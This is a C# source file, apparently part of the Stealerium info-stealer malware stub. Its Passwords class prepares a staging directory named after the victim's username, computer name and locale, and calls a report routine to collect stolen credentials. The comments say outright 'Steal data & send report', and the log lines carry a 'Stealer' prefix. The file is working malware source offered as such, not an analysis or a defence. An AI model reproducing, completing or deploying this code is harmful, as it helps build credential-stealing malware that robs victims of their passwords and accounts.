using System;
using System.IO;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.System;

namespace Stealerium.Stub.Target
{
    internal sealed class Passwords
    {
        // Directory to store passwords
        private static readonly string PasswordsStoreDirectory = Path.Combine(
            Paths.InitWorkDir(),
            $"{SystemInfo.Username}@{SystemInfo.Compname}_{SystemInfo.Culture}");

        // Steal data & send report
        public static string Save()
        {
            Logging.Log("Running passwords recovery...");

            try
            {
                PreparePasswordStoreDirectory();
                return Report.CreateReport(PasswordsStoreDirectory) ? PasswordsStoreDirectory : string.Empty;
            }
            catch (Exception ex)
            {
                Logging.Log($"Stealer >> Failed to save passwords: {ex.Message}");
                return string.Empty;
            }
        }

        // Prepares the password storage directory
        private static void PreparePasswordStoreDirectory()
        {
            if (Directory.Exists(PasswordsStoreDirectory))
            {
                try
                {
                    Filemanager.RecursiveDelete(PasswordsStoreDirectory);
                }
                catch (Exception ex)
                {
                    Logging.Log($"Stealer >> Failed to recursively delete the directory: {ex.Message}");
                    throw;
                }
            }

            Directory.CreateDirectory(PasswordsStoreDirectory);
        }
    }
}
